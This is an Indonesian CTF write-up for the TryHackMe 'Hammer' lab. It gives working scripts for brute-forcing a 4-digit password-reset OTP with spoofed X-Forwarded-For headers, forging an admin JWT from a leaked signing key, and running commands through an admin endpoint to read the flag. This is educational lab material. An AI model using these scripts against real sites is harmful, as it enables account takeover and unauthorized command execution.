# TryHackMe Hammer Writeup

> Writeup ini dibuat untuk dokumentasi pembelajaran CTF/lab TryHackMe **Hammer**.

## Informasi Target

```text
Target IP : <TARGET_IP>
Port      : 1337
URL       : http://<TARGET_IP>:1337
Domain    : hammer.thm
```

Tambahkan ke `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Isi:

```text
<TARGET_IP> hammer.thm
```

Akses:

```text
http://hammer.thm:1337
```

---

## 1. Recon

Scan port:

```bash
nmap -sC -sV -p- --min-rate 1000 <TARGET_IP>
```

Hasil penting:

```text
1337/tcp open  http
```

Aplikasi web berjalan pada port `1337`.

---

## 2. Directory Enumeration

Dari source page ditemukan pola direktori dengan prefix:

```text
hmr_
```

Lakukan fuzzing:

```bash
ffuf -u http://hammer.thm:1337/hmr_FUZZ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-mc 200,301
```

Ditemukan direktori:

```text
/hmr_logs
```

Buka:

```text
http://hammer.thm:1337/hmr_logs/
```

Dari file log ditemukan email valid:

```text
tester@hammer.thm
```

---

## 3. Password Reset OTP Brute Force

Akses halaman reset password:

```text
http://hammer.thm:1337/reset_password.php
```

Masukkan email:

```text
tester@hammer.thm
```

Aplikasi meminta recovery code / OTP 4 digit.

Karena format OTP hanya `0000` sampai `9999`, brute force dapat dilakukan.

Contoh script:

```python
import requests
import random

url = "http://hammer.thm:1337/reset_password.php"
email = "tester@hammer.thm"

for code in range(10000):
    session = requests.Session()

    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

    headers = {
        "X-Forwarded-For": fake_ip,
        "X-Forwarded-Host": fake_ip
    }

    session.post(
        url,
        data={"email": email},
        headers=headers
    )

    otp = f"{code:04d}"

    response = session.post(
        url,
        data={"recovery_code": otp},
        headers=headers
    )

    if "Invalid or expired recovery code" not in response.text:
        print(f"[+] OTP ditemukan: {otp}")
        print(response.text)
        break
```

Setelah OTP valid ditemukan, reset password akun.

Login menggunakan:

```text
Email    : tester@hammer.thm
Password : <PASSWORD_BARU>
```

---

## 4. Dashboard dan Endpoint Command

Setelah login, aplikasi mengirim request ke endpoint:

```text
/execute_command.php
```

Contoh request:

```http
POST /execute_command.php HTTP/1.1
Host: hammer.thm:1337
Authorization: Bearer <JWT>
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Cookie: PHPSESSID=<SESSION>; token=<JWT>; persistentSession=yes

{"command":"ls"}
```

Jika command tidak diizinkan, response:

```json
{
  "error": "Command not allowed"
}
```

Command `ls` dapat digunakan untuk melihat file di direktori web.

---

## 5. Menemukan Key File JWT

Jalankan command:

```json
{"command":"ls"}
```

Ditemukan file key:

```text
188ade1.key
```

Ambil isi key:

```bash
curl http://hammer.thm:1337/188ade1.key
```

Contoh output:

```text
<ISI_SECRET_KEY>
```

Catatan penting:

```text
188ade1.key = nama file key
<ISI_SECRET_KEY> = isi file key yang dipakai untuk sign JWT
```

Yang dipakai sebagai `secret_key` adalah **isi file**, bukan nama file.

---

## 6. Decode JWT

Ambil JWT dari Burp, lalu decode:

```python
import jwt

token = "PASTE_JWT_DI_SINI"

print(jwt.get_unverified_header(token))
print(jwt.decode(token, options={"verify_signature": False}))
```

Contoh header:

```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/html/188ade1.key"
}
```

Contoh payload:

```json
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1725193591,
  "exp": 1725199591,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```

Targetnya adalah mengubah role:

```json
"role": "admin"
```

---

## 7. Forge JWT Admin

Install PyJWT:

```bash
pip3 install pyjwt
```

Buat file:

```bash
nano craft_token.py
```

Isi:

```python
import time
import jwt

# Isi dengan content asli dari 188ade1.key
secret_key = "<ISI_SECRET_KEY>"

header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/188ade1.key"
}

now = int(time.time())

payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": now,
    "exp": now + 3600,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

token = jwt.encode(
    payload,
    secret_key,
    algorithm="HS256",
    headers=header
)

print(token)
```

Jalankan:

```bash
python3 craft_token.py | tail -n 1 | tr -d '\n' > token.txt
cat token.txt
```

Cek format JWT:

```bash
cat token.txt | awk -F. '{print NF-1}'
```

Output harus:

```text
2
```

---

## 8. Pakai Token Admin di Burp

Ganti token pada **dua tempat**:

```http
Authorization: Bearer <TOKEN_BARU>
```

dan:

```http
Cookie: PHPSESSID=<SESSION>; token=<TOKEN_BARU>; persistentSession=yes
```

Request final:

```http
POST /execute_command.php HTTP/1.1
Host: hammer.thm:1337
Authorization: Bearer <TOKEN_BARU>
X-Requested-With: XMLHttpRequest
Accept: */*
Content-Type: application/json
Origin: http://hammer.thm:1337
Referer: http://hammer.thm:1337/dashboard.php
Cookie: PHPSESSID=<SESSION>; token=<TOKEN_BARU>; persistentSession=yes
Connection: close

{"command":"ls"}
```

Jika token benar, error JWT seperti berikut tidak muncul lagi:

```text
Missing JWT
Expired token
Signature verification failed
```

---

## 9. Remote Command Execution

Setelah JWT admin valid, jalankan command untuk membaca flag:

```json
{"command":"cat /home/ubuntu/flag.txt"}
```

Response:

```text
THM{REDACTED}
```

---

## Troubleshooting

### 1. `400 Bad Request`

Penyebab umum:

```text
JWT kepotong menjadi beberapa baris
Cookie header rusak
Content-Length tidak sesuai
Body JSON tidak valid
```

Body harus valid JSON:

```json
{"command":"ls"}
```

---

### 2. `Missing JWT`

Artinya token tidak terkirim.

Contoh salah:

```http
Authorization: Bearer
```

Contoh benar:

```http
Authorization: Bearer eyJ...
```

---

### 3. `Expired token`

Token ada, tetapi `exp` sudah lewat.

Gunakan timestamp dinamis:

```python
now = int(time.time())

"iat": now,
"exp": now + 3600
```

---

### 4. `Signature verification failed`

Artinya signature JWT tidak cocok.

Penyebab umum:

```text
secret_key salah
kid salah
token di Authorization dan Cookie beda
token diedit tapi tidak di-sign ulang
```

Pastikan:

```python
secret_key = "<ISI_SECRET_KEY>"
```

bukan:

```python
secret_key = "188ade1"
```

kecuali isi file key memang `188ade1`.

---

### 5. `Command not allowed`

JWT sudah terbaca, tetapi command ditolak oleh filter aplikasi.

Coba command yang memang allowed, misalnya:

```json
{"command":"ls"}
```

Untuk membaca flag setelah admin token valid:

```json
{"command":"cat /home/ubuntu/flag.txt"}
```

---

## Kesimpulan

Room Hammer mengeksploitasi beberapa kelemahan berantai:

```text
Exposed logs       -> mendapatkan email valid
Weak OTP reset     -> reset password akun
JWT kid weakness   -> menemukan key file
JWT forgery        -> membuat token admin
Admin command exec -> membaca flag
```

Hal penting:

```text
Token tidak harus sama dengan writeup orang lain.
JWT akan berubah jika iat, exp, secret, kid, payload, atau session berbeda.
Yang penting token diterima server dan tidak menghasilkan error signature/expired.
```

---

## Flag

```text
Flag 1: THM{REDACTED}
Flag 2: THM{REDACTED}
```
